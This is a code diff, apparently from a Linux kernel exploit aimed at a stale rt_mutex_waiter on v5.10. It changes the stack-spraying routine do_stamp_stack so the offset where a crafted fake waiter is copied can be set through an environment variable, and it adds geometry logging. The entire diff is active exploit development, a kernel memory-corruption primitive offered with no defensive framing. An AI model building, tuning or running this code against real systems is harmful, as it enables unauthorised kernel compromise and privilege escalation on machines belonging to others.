@@ -55,8 +55,11 @@
 
 extern atomic_int g_consumer_go;
 
-/* b0q: stale rt_waiter lands at stamp-buffer +0x58 (live-measured). */
-#define EXP32_STAMP_OFF 0x58
+/* b0q: stale rt_waiter lands at stamp-buffer +0x58 (live-measured).
+ * Override at runtime via EXP32_STAMP_OFF (hex or dec) — parsed before
+ * the first stamp (getenv is pure userspace, no syscalls), so the
+ * no-syscalls-after-last-stamp invariant is unaffected. */
+#define EXP32_STAMP_OFF_DEFAULT 0x58
 /* v5.10 rt_mutex_waiter = 80 bytes */
 #define EXP32_WAITER_BYTES 0x50
 /* Enough stamps to be sure the full payload is what the last completed
@@ -64,13 +67,25 @@ extern atomic_int g_consumer_go;
 #define EXP32_STAMP_ROUNDS 64
 
 void do_stamp_stack(uint64_t *buf){
+    /* Resolve the stamp offset first so it can be logged before any
+     * kernel entry (no syscalls allowed after the last stamp). */
+    size_t stamp_off = EXP32_STAMP_OFF_DEFAULT;
+    const char *off_env = getenv("EXP32_STAMP_OFF");
+    if (off_env && *off_env) {
+        char *end = NULL;
+        unsigned long v = strtoul(off_env, &end, 0);
+        if (end != off_env && v + EXP32_WAITER_BYTES <= 260)
+            stamp_off = (size_t)v;
+    }
+    pr_info("stamp geometry: off=0x%zx waiter_bytes=0x%x\n",
+            stamp_off, EXP32_WAITER_BYTES);
     int fd = socket(AF_INET6, SOCK_DGRAM, 0);
     uint8_t buffer[260];
     if (fd < 0) {
         pr_warning("do_stamp_stack: socket failed errno=%d\n", errno);
         _exit(1);   /* let the parent retry with a fresh child */
     }
-    memcpy(buffer + EXP32_STAMP_OFF, buf, EXP32_WAITER_BYTES);
+    memcpy(buffer + stamp_off, buf, EXP32_WAITER_BYTES);
 
     /*
      * Probe ONE stamp and report it BEFORE the real loop.  After the last
